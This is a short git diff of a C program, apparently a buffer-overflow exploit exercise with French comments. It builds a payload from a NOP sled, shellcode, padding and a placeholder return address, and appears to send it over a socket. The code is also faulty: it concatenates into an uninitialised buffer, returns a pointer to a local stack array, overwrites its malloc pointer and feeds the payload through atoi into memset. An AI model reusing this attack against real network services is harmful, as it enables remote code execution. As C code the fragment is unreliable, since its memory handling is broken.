@@ -33,18 +33,22 @@ char* crafted_payload(){
 	char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
 	printf("%s\n", retour);
 
-	strcat(nops, shellcode);
-	strcat(padding_bp, retour);
-	strcat(nops, padding_bp);
-	printf("%s\n", nops);
+	char final_buf[sizeof(nops) + sizeof(shellcode) + sizeof(padding_bp) + sizeof(retour)];
 
-	pay_size = sizeof(nops);
+	strcat(final_buf, nops);
+	strcat(final_buf, shellcode);
+	strcat(final_buf, padding_bp);
+	strcat(final_buf, retour);
+	printf("%s\n", final_buf);
+
+	pay_size = sizeof(final_buf);
 	printf("%zu\n", pay_size);
 
 	char * pay = malloc(pay_size * sizeof(char));
+	printf("%zu\n", sizeof(pay));
 	pay = nops;
 
-	return pay;
+	return final_buf;
 }
 
 int func(int sockfd, char *pay)
@@ -73,6 +77,7 @@ int main (int argc, char *argv[]){
 
 	char payload[pay_size];
 	memset(payload, atoi(crafted_payload()), pay_size);
+	// sprintf ?
 	
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque)
